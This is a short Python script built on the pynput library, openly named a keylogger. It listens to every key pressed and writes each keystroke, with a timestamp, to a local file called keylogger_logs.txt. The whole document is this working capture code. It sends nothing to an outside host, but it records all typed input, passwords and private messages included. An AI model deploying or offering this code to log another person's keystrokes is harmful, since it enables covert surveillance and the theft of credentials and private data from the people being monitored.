from pynput.keyboard import Listener
import  logging
import datetime

datetime = datetime.datetime.now()

logging.basicConfig(filename=("keylogger_logs.txt"),level=logging.DEBUG, format=f'{datetime}: %(message)s')

def on_press(key):
    logging.info(str(key))
    # print(logging.info(str(key)))

with Listener(on_press=on_press) as listener:
    listener.join()
    # print(listener.join())